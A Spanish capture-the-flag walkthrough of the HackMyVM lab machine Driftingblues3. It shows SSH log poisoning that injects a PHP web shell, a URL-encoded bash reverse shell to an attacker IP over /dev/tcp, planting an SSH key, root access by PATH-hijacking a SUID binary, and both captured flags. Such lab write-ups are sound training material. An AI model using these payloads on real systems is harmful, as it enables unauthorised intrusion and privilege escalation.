---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Driftingblues3 HackMyVM (Easy- Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-10 11:50 EDT
Nmap scan report for 192.168.28.18
Host is up (0.0011s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/eventadmins
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:0E:A1:B3 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.42 seconds
```

Veremos que hay una pagina web alojada en el puerto `80` que si entramos veremos una pagina normal, por lo que vamos a intentar entrar al `robots.txt` a ver que nos encontramos.

```
URL = http://<IP>/robots.txt
```

Info:

```
User-agent: *
Disallow: /eventadmins
```

Veremos que hay un directorio llamado `/eventadmins` que si entramos dentro de el veremos esto otro:

```
man there's a problem with ssh

john said "it's poisonous!!! stay away!!!"

idk if he's mentally challenged

please find and fix it

also check /littlequeenofspades.html

your buddy, buddyG
```

Vemos lo que parece ser un archivo `HTML` en el que si probamos a entrar a el veremos esto otro:

```
URL = http://<IP>/littlequeenofspades.html
```

Info:

```
Now, she is a little queen of spades, and the men will not let her be

Mmmm, she is the little queen of spades, and the men will not let her be

Everytime she makes a spread, hoo fair brown, cold chill just runs all over me

I'm gon' get me a gamblin' woman, if the last thing that I do

Eee, gon' get me a gamblin' woman, if it's the last thing that I do

Well, a man don't need a woman, ooh fair brown, that he got to give all his money to

Everybody say she got a mojo, now she's been usin' that stuff

Mmmm, mmmm, 'verybody says she got a mojo, 'cause she been usin' that stuff

But she got a way trimmin' down, hoo fair brown, and I mean it's most too tough

Now, little girl, since I am the king, baby, and you is a queen

Ooo eee, since I am the king baby, and you is a queen

Le's us put our heads together, hoo fair brown, then we can make our money green
```

Si inspeccionamos la pagina veremos esta linea bastante interesante:

```html
<p style="color:white">aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==</p>
```

Veremos que esta codificado en `Base64` que si lo decodificamos veremos esto:

```shell
echo "aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==" | base64 -d
```

Info:

```
intruder? L2FkbWluc2ZpeGl0LnBocA==
```

Veremos que hay otro mensaje codificado de nuevo, por lo que lo decodificaremos de la siguiente forma:

```shell
echo "L2FkbWluc2ZpeGl0LnBocA==" | base64 -d
```

Info:

```
/adminsfixit.php
```

Vemos lo que parece ser otro archivo en la pagina web, vamos a probar a meternos de esta forma:

```
URL = http://<IP>/adminsfixit.php
```

Info:

```
#######################################################################

ssh auth log

============

i hope some wacky and uncharacteristic thing would not happen

this job is fucking poisonous and im boutta planck length away from quitting this hoe

-abuzer komurcu

#######################################################################
............................<RESTO_DE_LOGS>.......................................
Apr 10 10:57:01 driftingblues CRON[2018]: pam_unix(cron:session): session opened for user root by (uid=0) Apr 10 10:57:01 driftingblues CRON[2018]: pam_unix(cron:session): session closed for user root Apr 10 10:58:01 driftingblues CRON[2023]: pam_unix(cron:session): session opened for user root by (uid=0)
```

Vemos que nos esta mostrando de forma repetitiva que se esta abriendo una sesion de `root`, por lo que vamos a probar a intentar injectar algun comando para ver si se muestra de forma ejecutada.

Vamos a realizar un `LOG POISONING` mediante `SSH` ya que vemos que se esta realizando una conexion por `SSH` y cuando intentamos inciciar sesion por `SSH` se muestra el nombre de usuario, por lo que vamos a intentar injectar comandos mediante el nombre de usuario:

```shell
echo "<?php system(\$_GET['cmd']);?>" | nc <IP_VICTIM> 22
```

Info:

```
SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
Protocol mismatch.
```

Ahora echo esto tendremos que enviar la siguiente peticion para que se cargue dicho comando pero con el parametro enviado:

```
URL = http://<IP>/adminsfixit.php?cmd=ls
```

Info:

<figure><img src="../../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>

Veremos que ha funcionado, por lo que vamos a probar a enviarnos una `reverse shell` de la siguiente forma:

Volvamos a enviar este comando:

```shell
echo "<?php system(\$_GET['cmd']);?>" | nc <IP_VICTIM> 22
```

Y enviamos este `payload` de esta forma codificada en `URL`:

```
URL = http://<IP>/adminsfixit.php?cmd=bash+%20-c%20+"+bash+%20-i+%20>%26+%20/dev/tcp/192.168.28.19/7777+%200>%261+"
```

Pero antes de enviar eso por la `URL` nos pondremos a la escucha para obtener la `shell`:

```shell
nc -lvnp <PORT>
```

Y si enviamos el `payload`, volveremos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.28.19] from (UNKNOWN) [192.168.28.18] 53660
bash: cannot set terminal process group (512): Inappropriate ioctl for device
bash: no job control in this shell
www-data@driftingblues:/var/www/html$ whoami
whoami
www-data
```

Veremos que ha funcionado, por lo que tendremos que sanitizar la `shell`:

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user robertj

Si vamos a la `/home` y listamos en cuales podremos entrar veremos lo siguiente:

```
total 16
drwxr-xr-x  4 root    root    4096 Jan  4  2021 .
drwxr-xr-x 18 root    root    4096 Dec 17  2020 ..
drwx------  2 root    root    4096 Jan  4  2021 lost+found
drwxr-xr-x  3 robertj robertj 4096 Jan  7  2021 robertj
```

Vemos que podemos entrar en la carpeta de la `/home` del usuario `robertj` y si listamos dentro veremos lo siguiente:

```
total 16
drwxr-xr-x 3 robertj robertj 4096 Jan  7  2021 .
drwxr-xr-x 4 root    root    4096 Jan  4  2021 ..
drwx---rwx 2 robertj robertj 4096 Jan  4  2021 .ssh
-r-x------ 1 robertj robertj   33 Jan  7  2021 user.txt
```

Vemos que tambien podemos entrar en el `.ssh` de dicho usuario, por lo que podremos aprovechar esto para meter nuestra clave `PEM` de nuestro `host` y poder conectarnos por `SSH` sin necesidad de ingresar la contraseña de dicho usuario, pudiendo autenticarnos como el, por lo que haremos lo siguiente:

> MAQUINA HOST

```shell
ssh-keygen -t rsa -b 2048
```

Info:

```
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa.
Your public key has been saved in id_rsa.pub.
The key fingerprint is:
SHA256:QIVmdgs/c+NKnUDfqu7uGo57U/PdZf+6YdIKi6HAAH8 root@kali
The key's randomart image is:
+---[RSA 2048]----+
|      .o.        |
|     .* o        |
|.    +.= o .     |
| o     .* + .    |
|  o E   SB +     |
|   +    + =  .  o|
|    o .o.=....+o.|
|     +oooo.o.+...|
|    oo+B* . . ooo|
+----[SHA256]-----+
```

Ahora que hemos generado esto en la carpeta `.ssh/` vamos a copiarnos el contenido de la clave publica y pasarnosla un archivo que tendremos que llamar como `authorized_keys`, para que asi nos podamos conectar desde nuestro `host`:

```shell
cat ~/.ssh/id_rsa.pub
```

Info:

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7doSokNUW+9cQb5VIjousG+87SAqyEcP2mUuWZfLN0qARO/nCOa2rywRS9gl716wpUfS+K2mTL7QZ3CI6R6j/SW6QgazeTNtOy1jGRVQc+XQHncQBNTF7gCSkUT+jTiPLUrvdmi/oj2e7u5vkTNq4UQGLxzFpzYvhqMh6nY03vjPyzTGNN2u5QRik624TDIlS5+XWLInSw9Vo3PgxNfsn2qxWsU1ZGUsfEDIeWVy2s0K7pDHwn/DZyA41dzo4Hfx995YHZ45K30YjW7kdmgVddPhsl5kJksFuFzJ+OaubI+IWhNkiqnfB6MTFksBuBJRnzVGD9QjzigD33Mip2IY3 root@kali
```

Ahora en la maquina victima le pegaremos dicho contenido dentro de la carpeta `.ssh/` de la carpeta `robertj`:

```shell
nano /home/robertj/.ssh/authorized_keys

#Dentro del nano

<ID_RSA.pub>
```

Echo esto desde nuestro `host` vamos a conectarnos con dicho usuario con nuestra clave `PEM` desde el `host`.

```shell
ssh -i ~/.ssh/id_rsa robertj@<IP>
```

Info:

```
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
robertj@driftingblues:~$ whoami
robertj
```

Con esto veremos que ha funcionado, por lo que leeremos la `flag` del usuario.

> user.txt

```
413fc08db21285b1f8abea99040b0280
```

## Escalate Privileges

Si hacemos el `id` veremos esto:

```
uid=1000(robertj) gid=1000(robertj) groups=1000(robertj),1001(operators)
```

Veremos que pertenecemos al grupo `operators`, pero si listamos los permisos `SUID` que tenemos veremos esto:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
25269    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
    21909     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    16365     12 -rwsr-xr-x   1 root     root          10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
       81     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
    31095     20 -r-sr-s---   1 root     operators     16704 Jan  4  2021 /usr/bin/getinfo
     4028     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
       76     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
     4030     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
     3547     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
     3694     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
       79     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
       77     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
```

Veremos esta linea interesante, que casualmente pertenecemos a dicho grupo:

```
31095  20 -r-sr-s---  1 root   operators   16704 Jan  4  2021 /usr/bin/getinfo
```

Vamos a ver que pasa si lo ejecutamos:

```shell
/usr/bin/getinfo
```

Info:

```
###################
ip address
###################

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 08:00:27:0e:a1:b3 brd ff:ff:ff:ff:ff:ff
    inet 192.168.28.18/24 brd 192.168.28.255 scope global dynamic enp0s3
       valid_lft 367sec preferred_lft 367sec
    inet6 fe80::a00:27ff:fe0e:a1b3/64 scope link 
       valid_lft forever preferred_lft forever
###################
hosts
###################

127.0.0.1       localhost
127.0.1.1       driftingblues

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
###################
os info
###################

Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
```

Vemos que se estan ejecutando varios comandos y nos muestra la salida, pero vamos a ver si utiliza rutas `absolutas` dentro del binario.

```shell
cat /usr/bin/getinfo
```

Info:

```
.............................<CODIGO_COMPILADO>...................................
ip address
###################
^@ip a^@^@^@^@^@^@^@^@###################
hosts
###################
^@cat /etc/hosts^@^@^@###################
os info
###################
uname -a
.............................<CODIGO_COMPILADO>...................................
```

Vemos que mas o menos estamos viendo los comandos que esta utilizando, y no esta utilizando rutas `absolutas` por lo que podremos realizar la tecnica llamada `PATH hijacking/binary hijacking` con el binario `ip` en este caso.

Vamos a crear un script que ponga permisos `SUID` a la `bash` de la siguiente forma:

```shell
nano /tmp/ip

#Dentro del nano
#!/bin/bash

chmod u+s /bin/bash
echo "Permisos establecidos de forma correcta!"
```

Lo guardamos y ahora vamos a modificar el `PATH` para que cuando lo ejecutemos es ejecute como `root` el script llamado `ip` por lo que tendremos que poner que primero vaya a la ruta `/tmp` para que funcione:

```shell
chmod +x /tmp/ip
export PATH=/tmp:$PATH
```

Ahora si vemos el `PATH`:

```shell
echo $PATH
```

Info:

```
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Veremos que ha funcionado, por lo que vamos a ejecutar de nuevo el `binario`:

```shell
/usr/bin/getinfo
```

Info:

```
###################
ip address
###################

Permisos establecidos de forma correcta!
###################
hosts
###################
..........................<RESTO_CODIGO>.........................................
```

Ahora vamos a comprobar que esta bien ejecutado:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1168776 Apr 17  2019 /bin/bash
```

Vemos que funciono, por lo que vamos a ejecutar esto otro para obtener el usuario `root`:

```shell
bash -p
```

Info:

```
bash-5.0# whoami
root
```

Con esto veremos que somos `root` por lo que leeremos la `flag` del usuario `root`.

> root.txt

```
dfb7f604a22928afba370d819b35ec83
```
